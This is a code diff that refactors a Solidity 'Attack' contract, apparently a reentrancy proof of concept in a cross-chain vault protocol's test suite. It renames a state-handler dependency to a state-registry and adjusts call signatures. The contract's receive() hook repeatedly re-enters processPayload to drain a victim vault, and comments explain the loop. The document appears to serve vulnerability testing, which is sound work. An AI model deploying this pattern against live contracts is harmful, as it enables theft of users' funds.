@@ -7,9 +7,9 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {ERC1155Holder} from "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
 import {ERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol";
 import {IERC165} from "@openzeppelin/contracts/interfaces/IERC165.sol";
-import {StateReq} from "../types/lzTypes.sol";
-import {LiqRequest} from "../types/socketTypes.sol";
-import {StateHandler} from "../layerzero/stateHandler.sol";
+import {StateReq} from "../types/DataTypes.sol";
+import {LiqRequest} from "../types/LiquidityTypes.sol";
+import {StateRegistry} from "../crosschain-data/StateRegistry.sol";
 import {SuperRouter} from "../SuperRouter.sol";
 import {VaultMock} from "../mocks/VaultMock.sol";
 
@@ -18,21 +18,21 @@ import {VaultMock} from "../mocks/VaultMock.sol";
 /// @dev Attack contract must be able to hold the ERC1155 super positions
 contract Attack is Ownable, ERC1155Holder {
     address payable immutable superRouterSource;
-    address payable immutable stateHandlerDestination;
+    address payable immutable stateRegistryDestination;
     address payable immutable superDestination;
     address immutable victimUnderlyingAsset;
     address immutable victimVault;
 
     constructor(
         address payable superRouterSource_,
-        address payable stateHandlerDestination_,
+        address payable stateRegistryDestination_,
         address payable superDestination_,
         address victimUnderlyingAsset_,
         address victimVault_
     ) {
         superRouterSource = superRouterSource_;
 
-        stateHandlerDestination = stateHandlerDestination_;
+        stateRegistryDestination = stateRegistryDestination_;
 
         superDestination = superDestination_;
 
@@ -50,16 +50,13 @@ contract Attack is Ownable, ERC1155Holder {
 
     receive() external payable {
         /// @dev the last payload id is obtained (during execution this will be the same)
-        uint256 payloadId = StateHandler(stateHandlerDestination)
-            .totalPayloads();
-
-        /// @dev arbitrary safeGasParam
-        bytes memory safeGasParam;
+        uint256 payloadId = StateRegistry(stateRegistryDestination)
+            .payloadsCount();
 
         /// @dev the vault balance is obtained. This method of looping is rough but works
         /// @dev the best would be to set a variable with the number of loops needed to deplete the vault (calculate beforehand)
         /// @dev this check is important because if the transaction reverts in SuperDestination it enters the catch block
-        /// @dev of the destination chain stateHandler processPayload() function, which reverts
+        /// @dev of the destination chain stateRegistry processPayload() function, which reverts
         uint256 vaultBalance = VaultMock(victimVault).balanceOf(
             superDestination
         );
@@ -67,9 +64,8 @@ contract Attack is Ownable, ERC1155Holder {
         if (vaultBalance > 999) {
             // send enough eth as gas to keep the tx alive, 1 as example
             try
-                StateHandler(stateHandlerDestination).processPayload{value: 1}(
-                    payloadId,
-                    safeGasParam
+                StateRegistry(stateRegistryDestination).processPayload{value: 1}(
+                    payloadId
                 )
             {} catch {}
         }
@@ -98,18 +94,15 @@ contract Attack is Ownable, ERC1155Holder {
         StateReq[] calldata _stateData
     ) external payable onlyOwner {
         SuperRouter(superRouterSource).withdraw{value: msg.value}(
-            _stateData,
-            _liqData
+            _liqData,
+            _stateData
         );
     }
 
     /// @dev could be removed since anyone can call processPayload
     function processPayload(uint256 payloadId) external payable {
-        bytes memory safeGasParam;
-
-        StateHandler(stateHandlerDestination).processPayload{value: msg.value}(
-            payloadId,
-            safeGasParam
+        StateRegistry(stateRegistryDestination).processPayload{value: msg.value}(
+            payloadId
         );
     }
 
